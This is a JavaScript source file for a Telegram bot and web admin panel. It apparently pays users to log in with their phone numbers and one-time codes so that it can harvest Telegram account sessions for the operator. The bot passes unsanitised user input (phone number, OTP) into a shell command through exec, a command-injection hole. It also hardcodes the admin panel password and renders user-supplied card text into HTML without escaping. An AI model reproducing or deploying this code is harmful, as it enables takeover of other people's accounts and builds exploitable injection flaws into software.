import { Telegraf } from "telegraf";
import { exec } from "child_process";
import fs from "fs";
import path from "path";
import express from "express";
import bodyParser from "body-parser";
import dotenv from "dotenv";
import crypto from "crypto";

dotenv.config();

// ========= ENV =========
const BOT_TOKEN = process.env.BOT_TOKEN;
const API_ID = process.env.API_ID;
const API_HASH = process.env.API_HASH;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
const PORT = process.env.PORT || 3000;

const DATA_DIR = process.env.DATA_DIR || "./data";
const COUNTRY_FILE = path.join(DATA_DIR, "allowed_countries.json");
const BALANCE_FILE = path.join(DATA_DIR, "balances.json");
const WITHDRAW_FILE = path.join(DATA_DIR, "withdraw_requests.json");
const PENDING_SESS_FILE = path.join(DATA_DIR, "pending_sessions.json");

// Admin Panel Auth
const ADMIN_USER = "FrkBzy001";
const ADMIN_PASS = "Omorfaruk00";

// ========= FS =========
if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
for (const f of [COUNTRY_FILE, BALANCE_FILE, WITHDRAW_FILE, PENDING_SESS_FILE]) {
  if (!fs.existsSync(f)) {
    fs.writeFileSync(f, JSON.stringify(f.includes("withdraw") ? { requests: [] } : {}, null, 2));
  }
}

// ========= UTIL =========
const readJSON = (f) => { try { return JSON.parse(fs.readFileSync(f)); } catch { return {}; } };
const writeJSON = (f, d) => fs.writeFileSync(f, JSON.stringify(d, null, 2));

const loadCountries = () => readJSON(COUNTRY_FILE);
const saveCountries = (d) => writeJSON(COUNTRY_FILE, d);
const loadBalances = () => readJSON(BALANCE_FILE);
const saveBalances = (d) => writeJSON(BALANCE_FILE, d);
const loadWithdraws = () => readJSON(WITHDRAW_FILE);
const saveWithdraws = (d) => writeJSON(WITHDRAW_FILE, d);
const loadPending = () => readJSON(PENDING_SESS_FILE);
const savePending = (d) => writeJSON(PENDING_SESS_FILE, d);

const uid = () => crypto.randomBytes(8).toString("hex");

function addBalance(uid, name, amount) {
  const b = loadBalances();
  if (!b[uid]) b[uid] = { name, balance: 0 };
  b[uid].balance = Number((b[uid].balance + Number(amount)).toFixed(6));
  saveBalances(b);
  return b[uid].balance;
}
function deductBalance(uid, amt) {
  const b = loadBalances();
  if (!b[uid]) return 0;
  b[uid].balance = Math.max(0, b[uid].balance - amt);
  saveBalances(b);
  return b[uid].balance;
}
function detectCountryByPrefix(phone) {
  const c = loadCountries();
  const keys = Object.keys(c).sort((a, b) => b.length - a.length);
  const match = keys.find((k) => phone.startsWith(k));
  return match ? { prefix: match, ...c[match] } : null;
}
function getUserInfo(ctx) {
  const name = [ctx.from.first_name, ctx.from.last_name].filter(Boolean).join(" ");
  return `${name} ${ctx.from.username ? `@${ctx.from.username}` : ""} (ID:${ctx.from.id})`;
}
function generateRandomPassword(len = 16) {
  const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*";
  return Array.from({ length: len }, () => chars[Math.floor(Math.random() * chars.length)]).join("");
}

// ========= BOT =========
const bot = new Telegraf(BOT_TOKEN);
const userState = {};

const mainKeyboard = {
  reply_markup: {
    keyboard: [["💲 BALANCE", "💸 WITHDRAW", "📜 WITHDRAW HISTORY"]],
    resize_keyboard: true,
  },
};

bot.start((ctx) => {
  if (ctx.chat.type !== "private") return;
  userState[ctx.chat.id] = {};
  ctx.reply("👋 Welcome! Send phone number or choose option:", mainKeyboard);
});

bot.hears("💲 BALANCE", (ctx) => {
  const b = loadBalances();
  ctx.reply(`💰 Balance: $${(b[ctx.chat.id]?.balance || 0).toFixed(2)}`, mainKeyboard);
});

bot.hears("💸 WITHDRAW", (ctx) => {
  userState[ctx.chat.id] = { step: "withdraw_card" };
  ctx.reply("💳 Enter Leader Card:", mainKeyboard);
});

bot.hears("📜 WITHDRAW HISTORY", (ctx) => {
  const all = loadWithdraws().requests;
  const mine = all.filter((x) => x.user_id === ctx.chat.id);
  if (!mine.length) return ctx.reply("📭 No history found.", mainKeyboard);
  ctx.reply(mine.map((r) => `#${r.id} • $${r.amount} • ${r.status}`).join("\n"), mainKeyboard);
});

bot.on("text", (ctx) => {
  const userId = ctx.chat.id;
  const msg = ctx.message.text.trim();

  // Withdraw flow
  if (userState[userId]?.step === "withdraw_card") {
    userState[userId].card = msg;
    userState[userId].step = "withdraw_amt";
    return ctx.reply("💸 Enter amount (USD):", mainKeyboard);
  }
  if (userState[userId]?.step === "withdraw_amt") {
    const amt = Number(msg);
    if (!amt) return ctx.reply("❌ Invalid amount.");
    const wr = loadWithdraws();
    const id = uid();
    wr.requests.push({
      id,
      user_id: userId,
      username: ctx.from.username || "",
      card: userState[userId].card,
      amount: amt,
      status: "pending",
      date: new Date().toISOString(),
    });
    saveWithdraws(wr);
    userState[userId] = {};
    ctx.reply(`✅ Withdraw request #${id} submitted.`, mainKeyboard);
    return;
  }

  // Phone number
  if (msg.startsWith("+")) {
    const country = detectCountryByPrefix(msg);
    if (!country?.allowed) {
      return ctx.reply(`❌ Your country (${country?.country || "Unknown"}) is off.`, mainKeyboard);
    }
    ctx.reply("📲 Sending OTP...");
    const cmd = `python3 session.py ${API_ID} ${API_HASH} ${msg} request`;
    exec(cmd, (err, stdout) => {
      if (err || !String(stdout).includes("CODE_REQUESTED"))
        return ctx.reply("❌ OTP failed.");
      userState[userId] = { phone: msg, waitingForOtp: true, rate: country.rate };
      ctx.reply("✅ Enter OTP:", mainKeyboard);
    });
    return;
  }

  if (userState[userId]?.waitingForOtp) {
    ctx.reply("⏳ Verifying...");
    const { phone, rate } = userState[userId];
    const cmd = `python3 session.py ${API_ID} ${API_HASH} ${phone} otp=${msg}`;
    exec(cmd, async (err, stdout) => {
      if (err) return ctx.reply("❌ OTP verify failed.");
      if (!String(stdout).includes("SESSION_FILE"))
        return ctx.reply("❌ Session create failed.");
      const newBal = addBalance(userId, ctx.from.first_name, rate);
      ctx.reply(`✅ Session ok! Balance: $${newBal.toFixed(2)}`, mainKeyboard);
      await bot.telegram.sendMessage(
        ADMIN_CHAT_ID,
        `✅ New session from ${getUserInfo(ctx)}\n📞 ${phone}\n💲 $${rate}`
      );
    });
    userState[userId] = {};
    return;
  }

  ctx.reply("❌ Invalid input.", mainKeyboard);
});

// ========= ADMIN PANEL =========
const app = express();
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

// Auth
function auth(req, res, next) {
  const h = req.headers.authorization || "";
  const [u, p] = Buffer.from((h.split(" ")[1] || ""), "base64").toString().split(":");
  if (u === ADMIN_USER && p === ADMIN_PASS) return next();
  res.setHeader("WWW-Authenticate", 'Basic realm="Admin Panel"');
  return res.status(401).send("Authentication required");
}

app.get("/", auth, (req, res) => {
  const countries = loadCountries();
  const balances = loadBalances();
  const withdraws = loadWithdraws();
  const pending = loadPending();

  res.send(`
  <html>
  <head><title>Admin Panel</title></head>
  <body>
    <h1>🤖 Bot Admin Panel</h1>
    <h2>🌍 Country Settings</h2>
    <form method="POST" action="/set-country">
      <input name="prefix" placeholder="+1" required/>
      <input name="country" placeholder="Country" required/>
      <select name="allowed"><option value="true">Allowed</option><option value="false">Blocked</option></select>
      <input name="rate" type="number" step="0.01" placeholder="Rate" required/>
      <input name="confirmation_time" type="number" placeholder="Confirm(min)" required/>
      <button type="submit">Save</button>
    </form>
    <pre>${JSON.stringify(countries, null, 2)}</pre>

    <h2>💰 Balances</h2>
    <pre>${JSON.stringify(balances, null, 2)}</pre>

    <h2>💸 Withdraw Requests</h2>
    <table border="1" cellpadding="5">
    ${(withdraws.requests||[]).map(r => `
      <tr>
        <td>${r.id}</td><td>${r.user_id}</td><td>${r.card}</td>
        <td>$${r.amount}</td><td>${r.status}${r.txid ? `<br><small>TX:${r.txid}</small>` : ""}</td>
        <td>${r.date}</td>
        <td>
          ${r.status === "pending" ? `
          <form method="POST" action="/withdraw/${r.id}/approve">
            <input name="txid" placeholder="Txn ID" required/>
            <button>Approve</button>
          </form>
          <form method="POST" action="/withdraw/${r.id}/reject"><button>Reject</button></form>` : ""}
        </td>
      </tr>`).join("")}
    </table>
  </body>
  </html>
  `);
});

app.post("/set-country", auth, (req, res) => {
  const data = loadCountries();
  data[req.body.prefix] = {
    country: req.body.country,
    allowed: req.body.allowed === "true",
    rate: Number(req.body.rate),
    confirmation_time: Number(req.body.confirmation_time),
  };
  saveCountries(data);
  res.redirect("/");
});

app.post("/withdraw/:id/approve", auth, async (req, res) => {
  const w = loadWithdraws();
  const r = w.requests.find(x => x.id === req.params.id);
  if (r && r.status === "pending") {
    deductBalance(r.user_id, r.amount);
    r.status = "approved";
    r.txid = req.body.txid || "N/A";
    saveWithdraws(w);
    await bot.telegram.sendMessage(r.user_id, `✅ Withdraw Approved\n💸 $${r.amount}\n🔑 TX: ${r.txid}`);
  }
  res.redirect("/");
});

app.post("/withdraw/:id/reject", auth, async (req, res) => {
  const w = loadWithdraws();
  const r = w.requests.find(x => x.id === req.params.id);
  if (r && r.status === "pending") {
    r.status = "rejected";
    saveWithdraws(w);
    await bot.telegram.sendMessage(r.user_id, `❌ Withdraw Rejected\n💸 $${r.amount}`);
  }
  res.redirect("/");
});

// ✅ Redirect Fix
app.use((req, res) => {
  if (req.path === "/") return res.status(404).send("404 Not Found");
  return res.redirect("/");
});

// ========= START =========
app.listen(PORT, () => console.log(`🌐 Admin Panel running at :${PORT}`));
bot.launch();
console.log("🚀 Bot running...");
